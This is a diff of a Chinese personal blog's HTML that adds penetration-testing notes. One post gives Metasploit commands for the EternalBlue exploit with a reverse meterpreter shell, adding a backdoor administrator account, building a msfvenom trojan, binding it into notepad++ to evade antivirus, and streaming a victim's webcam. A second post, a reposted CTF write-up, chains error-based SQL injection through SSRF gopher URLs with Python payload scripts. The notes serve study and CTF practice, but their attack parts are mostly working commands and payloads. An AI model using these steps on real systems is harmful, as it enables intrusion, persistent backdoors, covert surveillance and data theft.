@@ -136,6 +136,35 @@
     <header class="article-header">
         
         <h1 itemprop="name">
+            <a href="/2023/07/21/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a>
+        </h1>
+        
+        <div class="article-meta clearfix">
+            <a class="article-date" href="http://example.com/index.html">
+    
+    <i class="icon-calendar vm"></i>
+    
+    <time class="vm" datetime="2023-07-21T01:59:32.000Z" itemprop="datePublished">2023-07-21</time>
+</a>
+
+            
+
+        </div>
+    </header>
+    
+    <section class="article-body markdown-body">
+        
+        
+        
+    </section>
+</article>
+
+
+    <article class="article" itemscope itemprop="blogPost">
+    
+    <header class="article-header">
+        
+        <h1 itemprop="name">
             <a href="/2023/07/20/%E4%BD%93%E9%AA%8Ckali%E6%B8%97%E9%80%8F/">体验kali渗透</a>
         </h1>
         
@@ -154,7 +183,38 @@
     
     <section class="article-body markdown-body">
         
-        
+        <h1 id="体验kali渗透工具"><a href="#体验kali渗透工具" class="headerlink" title="体验kali渗透工具"></a>体验kali渗透工具</h1><ol>
+<li>metasploit 攻击 windows 操作系统<br>启动metasploit前需要做：</li>
+</ol>
+<ul>
+<li>打开kali终端</li>
+<li>使用sudo su命令，并输入kali的密码kali，切换至root用户</li>
+<li>使用msfdb init命令 初始化metasploit数据库（*可选）</li>
+</ul>
+<h2 id="永恒之蓝漏洞："><a href="#永恒之蓝漏洞：" class="headerlink" title="永恒之蓝漏洞："></a>永恒之蓝漏洞：</h2><p>metasploit攻击永恒之蓝全流程：</p>
+<ol>
+<li>使用模块<br>use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</li>
+<li>设置必选项<br>查看必选项[*required 为 yes的就是必选项]<br>show options<br>set RHOSTS 192.168.1.128<br>[*RHOSTS为target host(s)代表你要攻击谁]</li>
+</ol>
+<p>set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp<br>[*payload是攻击载荷，就是攻击完成后想干啥，这里是想获取meterpreter]<br>[*meterpreter是meteasploit后渗透的神器]</p>
+<p>set LHOSTS 192.168.1.136<br>[*LHOSTS为listen host 代表你是谁，既kali的ip地址]</p>
+<p>set LPORT 12345<br>[*LPORT为listen port，代表你要在kali上开启的端口，1-65535随便选，但不能被占用]</p>
+<ol start="3">
+<li>运行模块，完成攻击<br>run</li>
+</ol>
+<h3 id="攻击成功后能做什么"><a href="#攻击成功后能做什么" class="headerlink" title="攻击成功后能做什么"></a>攻击成功后能做什么</h3><p>meterpreter是强大的后渗透模块，可以输入help查看帮助信息</p>
+<p>远程控制、命令执行、摄像头监控、密码获取、创建后门用户、破坏篡改系统…</p>
+<p>例：创建后门用户并开启远程连接<br>shell<br>net user zhangsan 123456&#x2F;add &amp;&amp; net localgroup administrators zhangsan &#x2F;add exit<br>run getgui-e</p>
+<h4 id="使用kali渗透工具生成远控木马"><a href="#使用kali渗透工具生成远控木马" class="headerlink" title="使用kali渗透工具生成远控木马"></a>使用kali渗透工具生成远控木马</h4><p>msfvenom是用来生成后门的软件，在目标上执行后门，在本地上监听上线。<br>[*msfvenom在shell里使用，不是msfconsole终端]</p>
+<p>Windows可执行程序后门：<br>msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;revers_tcp host&#x3D;192.168.123.136 lport&#x3D;9999 -f exe -o demo.exe</p>
+<p>-p：payload   -f：formant  exe：Windows可执行文件  -o：output</p>
+<p>生成木马在msfconsole里开启监听，等待受害者上钩<br>use exploit&#x2F;mutil&#x2F;handler<br>set payload windows&#x2F;x64&#x2F;meterprter&#x2F;reverse_tcp<br>set lhost 192.168.123.163<br>set lport 9999<br>run<br>参数要一致</p>
+<h5 id="免杀躲避火绒的探测"><a href="#免杀躲避火绒的探测" class="headerlink" title="免杀躲避火绒的探测"></a>免杀躲避火绒的探测</h5><ol>
+<li>最基础的免杀[*对于其他杀毒软件效果不同，具体情况请自行尝试]<br>捆绑木马<br>msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.1.136 lport&#x3D;9999 -f exe -x notepad+ +.exe -o notepad+ +.exe</li>
+</ol>
+<p>加壳：压缩壳、加密壳</p>
+<p>例：打开摄像头<br>meterpreter&gt; webcam_stream<br>Starting…<br>Preparing player…<br>Opening player at: &#x2F;home&#x2F;kali&#x2F;nprnAywg.html<br>Streaming…</p>
+
         
     </section>
 </article>
@@ -183,7 +243,29 @@
     
     <section class="article-body markdown-body">
         
-        
+        <p>查表：admin’) and extractvalue(1, concat(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema&#x3D;’security’),0x7e)) #</p>
+<p>python脚本：</p>
+<p>import urllib.parse<br>import base64<br>host &#x3D; “127.0.0.1:80”<br>payload &#x3D; “admin’) and extractvalue(1, concat(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema&#x3D;’security’),0x7e)) #”<br>base64_payload &#x3D; str(base64.b64encode(payload.encode(“utf-8”)), “utf-8”)<br>cookie&#x3D;”this_is_your_cookie&#x3D;”+base64_payload</p>
+<p>test &#x3D;<br>“””GET &#x2F;index.php HTTP&#x2F;1.1<br>Host: {}<br>Connection: close<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Cookie:{}</p>
+<p>“””.format(host,cookie)</p>
+<p>tmp &#x3D; urllib.parse.quote(test)<br>new &#x3D; tmp.replace(“%0A”,”%0D%0A”)<br>result &#x3D; urllib.parse.quote(new)<br>print(“gopher:&#x2F;&#x2F;“+host+”&#x2F;_”+result)</p>
+<p>payload:<a target="_blank" rel="noopener" href="http://61.147.171.105:57270/use.php?url=gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCAoU0VMRUNUIEdST1VQX0NPTkNBVChjb2x1bW5fbmFtZSkgRlJPTSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyBXSEVSRSB0YWJsZV9uYW1lPSdmbGFnJyksMHg3ZSkpICM%253D%250D%250A%250D%250A">http://61.147.171.105:57270/use.php?url=gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCAoU0VMRUNUIEdST1VQX0NPTkNBVChjb2x1bW5fbmFtZSkgRlJPTSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyBXSEVSRSB0YWJsZV9uYW1lPSdmbGFnJyksMHg3ZSkpICM%253D%250D%250A%250D%250A</a></p>
+<p>可以看到flag表中只有一个flag列</p>
+<p>查内容<br>admin’) and extractvalue(1, concat(0x7e, (SELECT flag from flag),0x7e)) #<br>python脚本</p>
+<p>import urllib.parse<br>import base64<br>host &#x3D; “127.0.0.1:80”<br>payload &#x3D; “admin’) and extractvalue(1, concat(0x7e, (SELECT flag from flag),0x7e)) #”<br>base64_payload &#x3D; str(base64.b64encode(payload.encode(“utf-8”)), “utf-8”)<br>cookie&#x3D;”this_is_your_cookie&#x3D;”+base64_payload</p>
+<p>test &#x3D;<br>“””GET &#x2F;index.php HTTP&#x2F;1.1<br>Host: {}<br>Connection: close<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Cookie:{}</p>
+<p>“””.format(host,cookie)</p>
+<p>tmp &#x3D; urllib.parse.quote(test)<br>new &#x3D; tmp.replace(“%0A”,”%0D%0A”)<br>result &#x3D; urllib.parse.quote(new)<br>print(“gopher:&#x2F;&#x2F;“+host+”&#x2F;_”+result)</p>
+<p>payload:<a target="_blank" rel="noopener" href="http://61.147.171.105:57270/use.php?url=gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCAoU0VMRUNUIGZsYWcgZnJvbSBmbGFnKSwweDdlKSkgIw%253D%253D%250D%250A%250D%250A">http://61.147.171.105:57270/use.php?url=gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCAoU0VMRUNUIGZsYWcgZnJvbSBmbGFnKSwweDdlKSkgIw%253D%253D%250D%250A%250D%250A</a></p>
+<p>此时出现了另一个问题，报错的回显最大位数为32位，此时我们只获得了32位，需要用substr函数进行分割读取：</p>
+<p>分割读取<br>admin’) and extractvalue(1, concat(0x7e, substr((SELECT flag from flag),30,32),0x7e)) #<br>python脚本:</p>
+<p>import urllib.parse<br>import base64<br>host &#x3D; “127.0.0.1:80”<br>payload &#x3D; “admin’) and extractvalue(1, concat(0x7e, substr((SELECT flag from flag),30,32),0x7e)) #”<br>base64_payload &#x3D; str(base64.b64encode(payload.encode(“utf-8”)), “utf-8”)<br>cookie&#x3D;”this_is_your_cookie&#x3D;”+base64_payload</p>
+<p>test &#x3D;<br>“””GET &#x2F;index.php HTTP&#x2F;1.1<br>Host: {}<br>Connection: close<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Cookie:{}</p>
+<p>“””.format(host,cookie)</p>
+<p>tmp &#x3D; urllib.parse.quote(test)<br>new &#x3D; tmp.replace(“%0A”,”%0D%0A”)<br>result &#x3D; urllib.parse.quote(new)<br>print(“gopher:&#x2F;&#x2F;“+host+”&#x2F;_”+result)</p>
+<p>payload:<a target="_blank" rel="noopener" href="http://61.147.171.105:57270/use.php?url=gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCBzdWJzdHIoKFNFTEVDVCBmbGFnIGZyb20gZmxhZyksMzAsMzIpLDB4N2UpKSAj%250D%250A%250D%250A">http://61.147.171.105:57270/use.php?url=gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCBzdWJzdHIoKFNFTEVDVCBmbGFnIGZyb20gZmxhZyksMzAsMzIpLDB4N2UpKSAj%250D%250A%250D%250A</a></p>
+<p>两次的结果一合并，获得flag<br>————————————————<br>版权声明：本文为CSDN博主「sean7777777」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/yuanxu8877/article/details/128069145">https://blog.csdn.net/yuanxu8877/article/details/128069145</a></p>
+
         
     </section>
 </article>
